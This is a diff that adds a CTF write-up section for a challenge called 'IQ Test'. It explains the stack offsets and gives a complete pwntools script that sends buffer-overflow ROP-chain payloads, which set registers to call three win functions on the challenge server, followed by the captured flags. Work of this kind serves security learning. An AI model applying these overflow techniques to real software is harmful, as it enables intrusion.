@@ -200,4 +200,59 @@ p.interactive()
 `nite{ch0pp3d_ch1n_r34lly_m4d3_2025_p34k_f0r_u5}`
 ***
 # 5. IQ Test
+hardest challenge so far
 ## Solution:
+[Decompiled the binary](assets_binex/iq-decomp.cpp) in *angr*, which provided me with addresses of all the variables from which I got the offsets
+  - for `win1`, `v0` is located at `[bp-0x98]`, converting to decimal we get 152 bytes + `pop_ret` for stack alignment + the address of `win1`, which we input into the first `fgets` to jump to `win1` and so on
+  - `win2` and `win3` require values at `RDI`, `RSI` and `RDX` as well so we include their addresses + the values needed
+  
+![](assets_binex/iq-final.png)
+
+The final script:
+```python
+from pwn import *
+
+elf = ELF('./chall')
+context.log_level = 'debug' # to get all output from the binary
+
+p = remote('iqtest.nitephase.live', 51823)
+
+win1 = elf.symbols['win1']
+win2 = elf.symbols['win2']
+win3 = elf.symbols['win3']
+pop_rdi = elf.symbols['pop_rdi_ret']
+pop_rsi = elf.symbols['pop_rsi_ret']
+pop_rdx = elf.symbols['pop_rdx_ret']
+pop_ret = 0x40101a
+
+print(p.recvuntil(b'>').decode())
+p.sendline(b'2')
+
+print(p.recvuntil(b'>').decode())
+p.sendline(b'1')
+
+print(p.recvuntil(b'>').decode())
+p.sendline(b'4')
+
+print(p.recvuntil(b':').decode())
+payload = b'A' * 152 + p64(pop_ret) + p64(win1)
+p.sendline(payload)
+
+print(p.recvuntil(b'Continue: ').decode())
+payload = b'A' * 40 + p64(pop_ret) + p64(pop_rdi) + p64(0xDEADBEEF) + p64(win2)
+p.sendline(payload)
+
+print(p.recvuntil(b'Final Test: ').decode())
+payload = b'A' * 56 + p64(pop_ret) + p64(pop_rdi) + p64(0xDEADBEEF) + p64(pop_rsi) + p64(0xDEAFFACE) + p64(pop_rdx) + p64(0xFEEDCAFE) + p64(win3)
+p.sendline(payload)
+
+print(p.recvall(timeout=2).decode())
+p.close()
+```
+
+## Flag:
+```
+nite{d1d_1_g3t_th3_fl4g?}
+nite{1_th1nk_1_f1n4lly_g0t_my_fl4g_n0w;)}
+nite{1m_th3_r34l_fl4g_blud_4l50_6-1_1s_m0r3_tuf}
+```
